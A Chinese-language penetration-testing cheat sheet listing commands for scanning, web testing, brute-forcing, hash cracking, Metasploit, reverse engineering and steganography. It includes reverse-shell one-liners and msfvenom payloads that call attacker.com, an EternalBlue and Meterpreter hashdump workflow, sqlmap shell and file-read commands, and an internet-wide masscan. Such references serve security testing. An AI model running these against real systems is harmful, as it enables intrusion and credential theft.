# 渗透测试工具速查

## 网络扫描

### Nmap

```bash
# 基础扫描
nmap target.com
nmap -sV target.com              # 服务版本
nmap -sC target.com              # 默认脚本
nmap -O target.com               # OS检测
nmap -A target.com               # 全面扫描

# 端口扫描
nmap -p 80,443 target.com        # 指定端口
nmap -p- target.com              # 全端口
nmap -F target.com               # 快速扫描

# 扫描类型
nmap -sS target.com              # SYN扫描
nmap -sT target.com              # TCP连接
nmap -sU target.com              # UDP扫描

# 输出格式
nmap -oN normal.txt target.com   # 普通
nmap -oX xml.xml target.com      # XML
nmap -oG grep.txt target.com     # Grepable
nmap -oA all target.com          # 全部格式

# 性能
nmap -T4 target.com              # 速度(0-5)
nmap --min-rate 1000 target.com  # 最小速率
```

### Masscan / Rustscan

```bash
# Masscan高速扫描
masscan -p80,443 0.0.0.0/0 --rate=100000
masscan 192.168.1.0/24 -p0-65535 --rate=10000

# Rustscan
rustscan -a target.com -- -sV -sC
```

## Web扫描

### SQLMap

```bash
# 基础使用
sqlmap -u "http://target.com/page.php?id=1"

# POST数据
sqlmap -u "http://target.com/login" --data="user=1&pass=1"

# 从文件
sqlmap -r request.txt

# 数据库操作
sqlmap -u "..." --dbs                    # 数据库
sqlmap -u "..." -D db --tables           # 表
sqlmap -u "..." -D db -T table --dump    # 数据

# 高级
sqlmap -u "..." --os-shell               # Shell
sqlmap -u "..." --file-read=/etc/passwd  # 读文件
```

### Gobuster

```bash
# 目录扫描
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://target.com -w wordlist.txt -x php,txt,html

# DNS子域名
gobuster dns -d target.com -w subdomains.txt

# 虚拟主机
gobuster vhost -u http://target.com -w subdomains.txt
```

## 暴力破解

### Hydra

```bash
# SSH
hydra -l admin -P passwords.txt ssh://target.com

# FTP
hydra -L users.txt -P passwords.txt ftp://target.com

# HTTP表单
hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid"

# RDP
hydra -l admin -P passwords.txt rdp://target.com
```

### John / Hashcat

```bash
# John
john --wordlist=wordlist.txt hash.txt
john --show hash.txt

# Hashcat
hashcat -m 0 hash.txt wordlist.txt     # MD5
hashcat -m 100 hash.txt wordlist.txt   # SHA1
hashcat -m 1000 hash.txt wordlist.txt  # NTLM

# 暴力破解
hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l
# ?l=小写, ?u=大写, ?d=数字, ?s=特殊字符, ?a=所有
```

## 漏洞利用框架

### Metasploit

```bash
# 启动
msfconsole -q

# 工作流
search type:exploit name:ms17_010
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS target.com
set LHOST attacker.com
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# Meterpreter
getuid
ps
migrate PID
hashdump
shell
```

## 密码学工具

### OpenSSL

```bash
# 生成密钥
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# 哈希
echo -n "text" | openssl dgst -md5
echo -n "text" | openssl dgst -sha256

# Base64
openssl base64 -in file.bin -out file.b64
openssl base64 -d -in file.b64 -out file.bin

# SSL连接
openssl s_client -connect target.com:443
```

### GPG

```bash
# 加密
gpg -e -r "Recipient" file.txt

# 解密
gpg -d file.txt.gpg

# 签名
gpg -s file.txt
```

## 流量分析

### Wireshark / tshark

```bash
# 过滤
ip.addr == 192.168.1.1
tcp.port == 80
http.request
frame contains "password"

# tshark捕获
tshark -i eth0 -w capture.pcap

# tshark分析
tshark -r capture.pcap -Y "http.request"
tshark -r capture.pcap --export-objects http,./objects/
```

## 逆向工具

### Radare2

```bash
r2 -A binary
[0x00000000]> s main        # 跳转到main
[0x00000000]> pdf           # 反汇编
[0x00000000]> iz            # 字符串
[0x00000000]> ii            # 导入函数
[0x00000000]> ood           # 调试模式
[0x00000000]> dc            # 继续运行
```

### GDB

```bash
gdb ./binary
(gdb) disas main
(gdb) b main          # 断点
(gdb) r               # 运行
(gdb) n               # 下一步
(gdb) s               # 单步进入
(gdb) x/10gx $rsp     # 查看内存
(gdb) x/s $rdi        # 查看字符串
```

## 杂项工具

### Binwalk

```bash
binwalk file.bin           # 分析
binwalk -e file.bin        # 提取
binwalk -Me file.bin       # 递归提取
```

### Exiftool

```bash
exiftool image.jpg         # 查看元数据
exiftool -all= image.jpg   # 清除元数据
```

### Steghide

```bash
steghide embed -cf image.jpg -ef secret.txt    # 嵌入
steghide extract -sf image.jpg                  # 提取
steghide info image.jpg                         # 信息
```

## 快速参考

### 一句话Shell

```bash
# Bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# NC
nc -e /bin/sh attacker.com 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
```

### MSFvenom

```bash
# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker.com LPORT=4444 -f elf -o shell.elf

# Windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker.com LPORT=4444 -f exe -o shell.exe

# Web
msfvenom -p php/reverse_php LHOST=attacker.com LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker.com LPORT=4444 -f war -o shell.war
```

### 提权检查

```bash
# Linux
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab

# Windows
whoami /priv
whoami /groups
systeminfo
```
